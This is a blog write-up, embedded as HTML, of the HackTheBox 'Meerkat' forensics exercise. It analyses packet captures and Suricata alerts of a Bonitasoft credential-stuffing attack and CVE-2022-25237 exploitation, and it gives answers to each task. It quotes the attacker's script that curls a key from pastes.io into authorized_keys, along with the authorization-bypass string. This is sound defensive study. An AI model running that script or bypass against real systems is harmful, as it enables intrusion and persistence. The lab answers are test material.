@@ -1,0 +1,894 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fuk.png">
+  <link rel="icon" href="https://img.dkdun.cn/v1/2024/12/83e0272660805f52.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="butt3rf1y">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Level：Easy">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-Meerkat">
+<meta property="og:url" content="http://example.com/2025/03/25/HTB-Meerkat/index.html">
+<meta property="og:site_name" content="(｡･ω･｡)Welcome~">
+<meta property="og:description" content="Level：Easy">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/2d3eff5a57f21a52.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/9eaa566db23c9844.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/1de875aa12ca6e20.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/d15abedf4025b4c8.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/edf61a39ff651bde.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/ee5943192138b836.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/0d2bbbd0045f432d.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/2594437ac78f5ae0.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/24ef4bf790f7f03b.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/df57b86c6dfdf705.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/61058c99549a3883.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/85c6f2cc07e9613f.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/b4fbaa938f71fac0.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/37a99f2a47b58887.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/c0aca04cdf7ced22.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/93e20f05d9fc32c4.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/e48656578bbfe459.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/3da479c6bf97b741.png">
+<meta property="article:published_time" content="2025-03-25T13:16:26.000Z">
+<meta property="article:modified_time" content="2025-03-25T13:41:33.358Z">
+<meta property="article:author" content="butt3rf1y">
+<meta property="article:tag" content="应急响应">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://img.dkdun.cn/v1/2025/12/2d3eff5a57f21a52.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>HTB-Meerkat - (｡･ω･｡)Welcome~</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"loading_img":"/img/loading.gif","onlypost":true,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 60vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>butt3rf1y&#39;s Space</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://img.dkdun.cn/v1/2025/12/3473793514d205aa.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HTB-Meerkat"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-03-25 21:16" pubdate>
+          2025年3月25日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          15 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+	<link rel="icon" href="https://img.dkdun.cn/v1/2024/12/e40f2f1a8320e35c.png" type="image/x-icon">
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">HTB-Meerkat</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2025年3月25日 晚上
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>Level：Easy</p>
+<span id="more"></span>
+
+<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>As a fast-growing startup, Forela has been utilising a business management platform. Unfortunately, our documentation is scarce, and our administrators aren’t the most security aware. As our new security provider we’d like you to have a look at some PCAP and log data we have exported to confirm if we have (or have not) been compromised.</p>
+<h1 id="Task-1"><a href="#Task-1" class="headerlink" title="Task 1"></a>Task 1</h1><p>对于流量包，我的习惯是从 http 协议的流量开始分析，所以先过滤 http 流量，而且 4 开头的状态码都没用</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http&amp;&amp;!http.response.code &gt; 400<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img.dkdun.cn/v1/2025/12/2d3eff5a57f21a52.png"></p>
+<p>可以看到有很多 POST 请求</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/9eaa566db23c9844.png"></p>
+<p>追踪 TCP 流发现应该是在进行登录，这大量的请求挺像在爆破的</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/1de875aa12ca6e20.png"></p>
+<p>谷歌搜索 <code>bonita</code> 发现了软件，“Get limitless extensibility with Bonita, the process automation platform that doesn’t lock you in”，一个流程自动化平台，所以答案为 <code>bonitasoft</code></p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">We <span class="hljs-keyword">believe </span>our <span class="hljs-keyword">Business </span>Management Platform server has <span class="hljs-keyword">been </span>compromised. Please can you confirm the name of the application running?<br>:<span class="hljs-keyword">BonitaSoft</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="Task-2"><a href="#Task-2" class="headerlink" title="Task 2"></a>Task 2</h1><p>从数据中可以看出 <code>156.146.62.213</code> 一直在向 <code>172.31.6.44</code> 的 <code>/bonita/loginservice</code> 发送请求，追踪流会发现每个包的请求的 <code>username</code> 和 <code>password</code> 字段的值都不一样，确实应该是在爆破</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/d15abedf4025b4c8.png"></p>
+<p>看了一些数据之后会发现有一定的规律，用户名大多数以 <code>@forela.co.uk</code> 结尾，不仅如此还有 <code>install</code> 用户的请求信息</p>
+<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-keyword">install</span>:<span class="hljs-keyword">install</span><br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://documentation.bonitasoft.com/bonita/latest/identity/tenant-admin-credentials">Tenant administrator credentials</a></p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/edf61a39ff651bde.png"></p>
+<p><code>install</code>  是 Bonitasoft 的默认用户，可以猜一下可能是有泄露的一些账户，符合 <a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1110/004/">Brute Force: Credential Stuffing</a> 条件，暴力破解的一种技术：凭证填充，也叫撞库攻击</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">We believe <span class="hljs-keyword">the</span> attacker may have used <span class="hljs-keyword">a</span> subset <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> brute forcing attack category - what is <span class="hljs-keyword">the</span> name <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> attack carried out?<br>:Credential Stuffing<br></code></pre></td></tr></table></figure>
+
+<h1 id="Task-3"><a href="#Task-3" class="headerlink" title="Task 3"></a>Task 3</h1><p>用 <code>jq</code> 获取文件中不同警报签名 <code>alert.signature</code> 字段出现次数，然后按照次数从高到低排序</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─# <span class="hljs-built_in">cat</span> <span class="hljs-string">&#x27;/mnt/f/渗透/HackTheBox/meerkat/meerkat-alerts.json&#x27;</span> | jq <span class="hljs-string">&#x27;.[].alert.signature&#x27;</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -nr<br>    134 <span class="hljs-string">&quot;ET INFO User-Agent (python-requests) Inbound to Webserver&quot;</span><br>     59 <span class="hljs-string">&quot;ET WEB_SPECIFIC_APPS Bonitasoft Default User Login Attempt M1 (Possible Staging for CVE-2022-25237)&quot;</span><br>     17 <span class="hljs-string">&quot;ET DROP Dshield Block Listed Source group 1&quot;</span><br>     12 <span class="hljs-string">&quot;ET EXPLOIT Bonitasoft Authorization Bypass M1 (CVE-2022-25237)&quot;</span><br>      6 <span class="hljs-string">&quot;ET POLICY GNU/Linux APT User-Agent Outbound likely related to package management&quot;</span><br>      4 <span class="hljs-string">&quot;GPL WEB_SERVER DELETE attempt&quot;</span><br>      4 <span class="hljs-string">&quot;ET EXPLOIT Bonitasoft Successful Default User Login Attempt (Possible Staging for CVE-2022-25237)&quot;</span><br>      4 <span class="hljs-string">&quot;ET EXPLOIT Bonitasoft Authorization Bypass and RCE Upload M1 (CVE-2022-25237)&quot;</span><br>      3 <span class="hljs-string">&quot;ET CINS Active Threat Intelligence Poor Reputation IP group 84&quot;</span><br>      3 <span class="hljs-string">&quot;ET CINS Active Threat Intelligence Poor Reputation IP group 82&quot;</span><br>      2 null<br>      1 <span class="hljs-string">&quot;GPL SNMP public access udp&quot;</span><br>      1 <span class="hljs-string">&quot;ET SCAN Suspicious inbound to PostgreSQL port 5432&quot;</span><br>      1 <span class="hljs-string">&quot;ET SCAN Suspicious inbound to Oracle SQL port 1521&quot;</span><br>      1 <span class="hljs-string">&quot;ET SCAN Suspicious inbound to mySQL port 3306&quot;</span><br>      1 <span class="hljs-string">&quot;ET SCAN Suspicious inbound to MSSQL port 1433&quot;</span><br>      1 <span class="hljs-string">&quot;ET SCAN Potential VNC Scan 5900-5920&quot;</span><br>      1 <span class="hljs-string">&quot;ET SCAN Potential VNC Scan 5800-5820&quot;</span><br>      1 <span class="hljs-string">&quot;ET CINS Active Threat Intelligence Poor Reputation IP group 81&quot;</span><br>      1 <span class="hljs-string">&quot;ET CINS Active Threat Intelligence Poor Reputation IP group 76&quot;</span><br>      1 <span class="hljs-string">&quot;ET CINS Active Threat Intelligence Poor Reputation IP group 31&quot;</span><br>      1 <span class="hljs-string">&quot;ET CINS Active Threat Intelligence Poor Reputation IP group 29&quot;</span><br>      1 <span class="hljs-string">&quot;ET CINS Active Threat Intelligence Poor Reputation IP group 13&quot;</span><br>      1 <span class="hljs-string">&quot;ET ATTACK_RESPONSE Possible /etc/passwd via HTTP (linux style)&quot;</span><br>      1 <span class="hljs-string">&quot;ET 3CORESec Poor Reputation IP group 42&quot;</span><br>      1 <span class="hljs-string">&quot;ET 3CORESec Poor Reputation IP group 18&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>可以发现频繁出现了 <code>CVE-2022-25237</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">jq <span class="hljs-string">&#x27;.[].alert.signature&#x27;</span> <span class="hljs-string">&#x27;/mnt/f/渗透/HackTheBox/meerkat/meerkat-alerts.json&#x27;</span> | grep CVE<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img.dkdun.cn/v1/2025/12/ee5943192138b836.png"></p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Does <span class="hljs-keyword">the</span> vulnerability exploited have <span class="hljs-keyword">a</span> CVE assigned - <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span> so, which <span class="hljs-literal">one</span>?<br>:CVE<span class="hljs-number">-2022</span><span class="hljs-number">-25237</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="Task-4"><a href="#Task-4" class="headerlink" title="Task 4"></a>Task 4</h1><p>“i18ntranslation or &#x2F;..&#x2F;i18ntranslation&#x2F; to the end of a URL” </p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/0d2bbbd0045f432d.png"></p>
+<p>同样，我们在流量包里过滤一下也能发现</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http &amp;&amp; !http.response.code &gt; 400 &amp;&amp; http.request.uri matches &quot;API&quot;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img.dkdun.cn/v1/2025/12/2594437ac78f5ae0.png"></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Which string was appended <span class="hljs-keyword">to</span> the API URL <span class="hljs-type">path</span> <span class="hljs-keyword">to</span> bypass the <span class="hljs-keyword">authorization</span> <span class="hljs-keyword">filter</span> <span class="hljs-keyword">by</span> the attacker<span class="hljs-string">&#x27;s exploit?</span><br><span class="hljs-string">:i18ntranslation</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="Task-5"><a href="#Task-5" class="headerlink" title="Task 5"></a>Task 5</h1><p>首先过滤出带有 POST 请求 <code>/bonita/loginservice</code> 的数据，118 条</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http.request.method ==&quot;POST&quot; &amp;&amp; http.request.uri contains &quot;/bonita/loginservice&quot;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img.dkdun.cn/v1/2025/12/24ef4bf790f7f03b.png"></p>
+<p>把带有 <code>install</code> 用户的数据包过滤了</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http.request.method ==&quot;POST&quot; &amp;&amp; http.request.uri contains &quot;/bonita/loginservice&quot; &amp;&amp; !http contains &quot;install&quot;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img.dkdun.cn/v1/2025/12/df57b86c6dfdf705.png"></p>
+<p>过滤出来了 59 条</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/61058c99549a3883.png"></p>
+<p>但是发现其中有四条是重复的，所以总共 56 条</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">How</span> many combinations of usernames <span class="hljs-keyword">and</span> passwords were used in the credential stuffing attack?<br>:<span class="hljs-number">56</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="Task-6"><a href="#Task-6" class="headerlink" title="Task 6"></a>Task 6</h1><p>查看会话信息能发现，用户 <code>seb.broom@forela.co.uk</code> 尝试登陆后状态码变成了 204 ，表名已经身份验证成功了</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">username</span>=seb.broom@forela.co.uk&amp;password=g0vernm3nt<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img.dkdun.cn/v1/2025/12/85c6f2cc07e9613f.png"></p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-title class_">Which</span> username <span class="hljs-keyword">and</span> password combination was successful?<br><span class="hljs-symbol">:seb</span>.broom<span class="hljs-variable">@forela</span>.<span class="hljs-symbol">co.uk:</span>g0vernm3nt<br></code></pre></td></tr></table></figure>
+
+<h1 id="Task-7"><a href="#Task-7" class="headerlink" title="Task 7"></a>Task 7</h1><p>结合前面的来看，这一段是在登录成功之后，然后进行了几个操作：</p>
+<ul>
+<li><p>上传 zip 文件利用了 CVE</p>
+</li>
+<li><p>执行 whoami</p>
+</li>
+<li><p>执行 cat &#x2F;etc&#x2F;passwd</p>
+</li>
+<li><p>删除上传的文件</p>
+</li>
+<li><p>利用 wget 下载文件</p>
+</li>
+</ul>
+<p><img src="https://img.dkdun.cn/v1/2025/12/b4fbaa938f71fac0.png"></p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/37a99f2a47b58887.png"></p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/c0aca04cdf7ced22.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://pastes.io/raw/bx5gcr0et8<br></code></pre></td></tr></table></figure>
+
+<p>所以网站为 ：pastes.io</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">If <span class="hljs-keyword">any</span>, which <span class="hljs-keyword">text</span> sharing site did <span class="hljs-keyword">the</span> attacker utilise?<br>:pastes.io<br></code></pre></td></tr></table></figure>
+
+<h1 id="Task-8"><a href="#Task-8" class="headerlink" title="Task 8"></a>Task 8</h1><p>同样尝试  wget 文件下来发现是一个脚本，用于 <code>curl</code> 读取另一个 <code>hffgra4unv</code> 文件，并将其写入 Ubuntu 的 <code>authorized_keys</code> 文件中</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>curl https://pastes.io/raw/hffgra4unv &gt;&gt; /home/ubuntu/.ssh/authorized_keys<br><span class="hljs-built_in">sudo</span> service ssh restart<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img.dkdun.cn/v1/2025/12/93e20f05d9fc32c4.png"></p>
+<p>所以 <code>hffgra4unv</code> 文件中有公钥</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Please provide <span class="hljs-keyword">the</span> filename <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> public key used <span class="hljs-keyword">by</span> <span class="hljs-keyword">the</span> attacker <span class="hljs-built_in">to</span> gain persistence <span class="hljs-keyword">on</span> <span class="hljs-title">our</span> <span class="hljs-title">host</span>.<br>:hffgra4unv<br></code></pre></td></tr></table></figure>
+
+<h1 id="Task-9"><a href="#Task-9" class="headerlink" title="Task 9"></a>Task 9</h1><p>写入 <code>/home/ubuntu/.ssh/authorized_keys</code> 中</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-title class_">Can</span> you confirm the file modified by the attacker to gain persistence?<br><span class="hljs-symbol">:/home/ubuntu/</span>.ssh/authorized_keys<br></code></pre></td></tr></table></figure>
+
+<h1 id="Task-10"><a href="#Task-10" class="headerlink" title="Task 10"></a>Task 10</h1><p>根据线索查找，持久性并且对账户操作，<a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1098/004/">Account Manipulation: SSH Authorized Keys</a></p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada">Can you confirm the MITRE technique ID <span class="hljs-keyword">of</span> this <span class="hljs-keyword">type</span> <span class="hljs-type">of </span>persistence mechanism?<br>:T1098.<span class="hljs-number">004</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><h2 id="jq"><a href="#jq" class="headerlink" title="jq"></a>jq</h2><p>jq 用于处理 JSON 输入，将给定过滤器应用于其 JSON 文本输入并在标准输出上将过滤器的结果生成为 JSON</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">-n, --null-input          使用 null 作为单一输入值；<br>-R, --raw-input           将每行输入视为原始字符串（而非JSON）；<br>-s, --slurp               将所有输入读取到一个数组中，并作为单一输入值；<br>-c, --compact-output      输出紧凑格式（而非美化格式）；<br>-r, --raw-output          直接输出字符串（不转义且不加引号）；<br>	--raw-output0         同 -r，但每条输出后追加 NUL空字符；<br>-j, --join-output         同 -r，但输出后不换行；<br>-a, --ascii-output        仅用 ASCII 转义序列输出字符串；<br>-S, --sort-keys           输出时对每个对象的键排序；<br>-C, --color-output        彩色输出 JSON；<br>-M, --monochrome-output   禁用彩色输出；<br>	--tab                 使用制表符缩进；<br>	--indent n            使用 n 个空格缩进（最多7个）；<br>	--unbuffered          每次输出后立即刷新输出流；<br>	--stream              以流式处理方式解析输入值；<br>	--stream-errors       同 --stream，并将解析错误报告为数组；<br>	--<span class="hljs-built_in">seq</span>                 按 application/json-seq 格式解析输入/输出；<br></code></pre></td></tr></table></figure>
+
+<p>详细教程：<a target="_blank" rel="noopener" href="https://cn.linux-console.net/?p=11006">如何使用 jq 从 Linux 命令行解析 json 文件</a></p>
+<h2 id="Credential-Stuffing"><a href="#Credential-Stuffing" class="headerlink" title="Credential Stuffing"></a>Credential Stuffing</h2><p>凭证填充，习惯性称为 “撞库”，就是利用从一项服务上的数据泄露中获得的登录凭据尝试登录到另一个不相关的服务，获取对其他服务上用户帐户的未授权访问。简单来说就是假如攻击者在一个服务上窃取了很多账号，然后使用相同的登录凭证去登录银行账户，猜测在银行也有这些账户使用同样的用户名和密码（因此不要所有的账户都用相同的密码hhhh）。利用的是数据泄露，所以大大提高了成功率。</p>
+<h2 id="CVE-2022-25237"><a href="#CVE-2022-25237" class="headerlink" title="CVE-2022-25237"></a>CVE-2022-25237</h2><p>详细信息：<a target="_blank" rel="noopener" href="https://rhinosecuritylabs.com/application-security/cve-2022-25237-bonitasoft-authorization-bypass/">CVE-2022-25237：Bonitasoft 授权绕过和 RCE</a></p>
+<p>Bonita Web 2021.2 受到身份验证&#x2F;授权绕过漏洞的影响，原因是 <code>RestAPIAuthorizationFilter</code> 中使用的排除模式过于宽泛。通过在 <code>URL</code> 末尾附加 <code>;i18ntranslation</code> 或 <code>/../i18ntranslation/</code>，没有权限的用户可以访问特权 <code>API</code> 端点，这可能导致通过滥用特权 <code>API</code> 操作直接 RCE。</p>
+<p>漏洞点来自系统中的  <code>web.xml</code> 文件，用于定义系统应用的路由和如何处理路由的身份验证及授权</p>
